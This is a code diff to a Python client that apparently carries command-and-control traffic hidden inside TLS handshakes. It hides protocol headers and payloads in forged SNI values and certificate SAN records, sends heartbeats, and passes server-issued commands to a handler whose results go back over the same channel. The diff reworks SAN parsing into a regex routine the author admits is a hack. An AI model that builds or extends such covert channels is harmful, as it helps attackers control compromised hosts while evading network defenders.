@@ -126,15 +126,16 @@ class Session:
         response = self._send_message()
         if not response:
             return
-        # Check server response bytes; First extract our protocol msg in random seed field
-        proto_header = self._get_protocol_header(response)
+        # Check server response bytes; First extract our protocol msg in the SAN record
+        proto_header, san_payload = self._parse_server_hello(response)
+        # print("DEBUG")
+        # print(san_payload)
+        # print("DEBUG")
         # Now parse our header
         # The Server tells us what our client ID will be
         self.client_id = Message().get_client_id(proto_header)
         if Message().get_msg_type(proto_header) != ServerMessage.ACK:
-            self.result_msg = "Did not recieve an ACK message in response to our CONNECT request"
-            print(str(proto_header.hex()))
-            print(str(Message().get_msg_type(proto_header).hex()))
+            self.result_msg = f"Did not recieve an ACK message in response to our CONNECT request: Got '{Message().get_msg_type(proto_header).hex()}' instead"
             # print(str(ServerMessage.ACK))
             # print(len(proto_header))
         else:
@@ -181,7 +182,7 @@ class Session:
             if self.is_heartbeat_active:
                 self._set_tls_client_hello(ClientMessage().heartbeat(self.client_id), self._get_random_sni())
                 response = self._send_message()
-                proto_header = self._get_protocol_header(response)
+                proto_header, san_payload = self._parse_server_hello(response)
                 msg_type = Message().get_msg_type(proto_header)
                 if msg_type != ServerMessage.ACK and msg_type != ServerMessage.CMD_AVAILABLE:
                     self.heartbeats_missed += 1
@@ -197,16 +198,15 @@ class Session:
                 # Check if the server wants us to do anything
                 if msg_type == ServerMessage.CMD_AVAILABLE:
                     # grab whatever is in the SNI and send it to the API
-                    msg = self._parse_server_hello(response)
                     msg_text = ""
                     try:
-                        msg_text = msg.decode()
+                        msg_text = san_payload.decode()
                     except:
-                        msg_text = msg.hex()
-                    api_result = API().client_handle(msg)
+                        msg_text = san_payload.hex()
+                    api_result = API().client_handle(msg_text)
                     self.send(api_result)
                     self.message_list.append(
-                        f"RECV < [[ {len(msg)} bytes; msg_type={msg_type.hex()}; request= ` {msg_text[:50]} ` ]]"
+                        f"RECV < [[ {len(san_payload)} bytes; msg_type={msg_type.hex()}; request= ` {msg_text[:50]} ` ]]"
                     )
 
     def send(self, message: bytes) -> bool:
@@ -261,7 +261,7 @@ class Session:
                     self.result_msg = "Failed to resend message - Max retries reached"
                     return False
                 response = self._send_message()
-                proto_header = self._get_protocol_header(response)
+                proto_header, san_payload = self._parse_server_hello(response)
                 msg_type = Message().get_msg_type(proto_header)
                 if msg_type == ServerMessage.CRC_ERROR:
                     continue
@@ -460,7 +460,8 @@ class Session:
         return response_data
 
     def _parse_server_hello(self, response_bytes: bytes) -> bytes:
-        """Extracts SAN message from response bytes; Returns bytes"""
+        """Extracts SAN message from response bytes;
+        Returns TUPLE of bytes: Our protocol header, and any message that may be present"""
         hex_str = response_bytes.hex()
         hex_array = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]
         position = self._validate_handshake_msg(hex_str, hex_array)
@@ -471,10 +472,16 @@ class Session:
         message = b""
         for hex_record in san_records_hex:
             message = message + bytes.fromhex("".join(bytes.fromhex(hex_record).decode().split(".")[:-2]))
-        return message
+        protocol_header = bytes.fromhex(message[:64].decode())
+        # print("DEBUG")
+        # print(message[64:])
+        # print("/DEBUG")
+        san_message = message[64:]
+        return (protocol_header, san_message)
 
     def _get_protocol_header(self, response_bytes: bytes) -> bytes:
         """Extracts random seed field (our protocol headers) from a TLS Server Hello"""
+        # NOTE: It exstracts this from the SAN Field
         hex_str = response_bytes.hex()
         is_valid_handshake = True
         handshake_len = 0
@@ -571,25 +578,21 @@ class Session:
             if san_records:
                 break
             hex_str = "".join(cert)
-            byte_position = [
-                (m.start(0), m.end(0))
-                for m in re.finditer("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
-            ][0][0]
-            san_record_matches = re.search("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
-            if len(san_record_matches.groups()) != 3:
-                continue
-            record_len = int(san_record_matches.groups()[2], 16)
-            byte_position += 22
-            while byte_position < (byte_position + record_len):
-                if hex_str[byte_position : byte_position + 2] != "82":
-                    break
-                byte_position += 2
-                dns_len = int(hex_str[byte_position : byte_position + 2], 16)
-                byte_position += 2
-                if dns_len < 1:
-                    break
-                san_records.append(hex_str[byte_position : byte_position + dns_len * 2])
-                byte_position += dns_len * 2
+            # Re-write this to be more simple, less error prone
+            expression = "0603551d1104[0-9a-f]{3,8}([0-9a-f]{2})82"
+            field_len = int(re.search(expression, hex_str).groups()[0], 16)
+            expression = "0603551d1104[0-9a-f]{3,8}([0-9a-f]{2})82([0-9a-f]{" + str(field_len * 2) + "})"
+            san_record = re.search(expression, hex_str).groups()[1]
+            # trim headers, tailers
+            san_record = san_record[2:]
+            san_record = san_record[:-2]
+            # this is a hack because I cant figure out how this is constructed :/
+            # strip non-ascii chars
+            if ord(san_record[0]) < 128:
+                san_record = san_record[2:]
+            san_records.append(san_record)
+            # print(bytes.fromhex(hex_record).decode())
+            # print("/DEBUG")
         return san_records
 
 
